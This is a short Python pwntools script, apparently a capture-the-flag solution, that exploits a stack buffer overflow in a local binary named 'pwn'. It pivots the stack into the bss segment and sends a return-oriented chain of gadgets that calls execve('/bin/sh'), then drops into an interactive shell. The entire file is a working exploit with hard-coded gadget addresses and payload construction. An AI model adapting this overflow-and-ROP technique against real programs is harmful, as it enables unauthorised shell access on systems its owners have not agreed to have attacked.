#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./pwn')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

syscall = 0x0000000000401185 # syscall
pop_rax = 0x000000000040117e # pop rax ; ret
pop_rdi = 0x0000000000401180 # pop rdi ; ret
pop_rsi_rdx = 0x0000000000401182 # pop rsi ; pop rdx ; ret

bss = 0x404600
payload = b'a'* 0x40 + p64(bss) + p64(0x4011a5)

io.sendafter(b"you make a syscall?", payload)

pause()

at_bss = b"/bin/sh\x00"
at_bss = at_bss.ljust(0x48,b'\x00')
at_bss += flat(
    pop_rdi, bss - 0x40, pop_rsi_rdx, 0, 0, pop_rax, 0x3b, syscall
)

io.send(at_bss)


io.interactive()

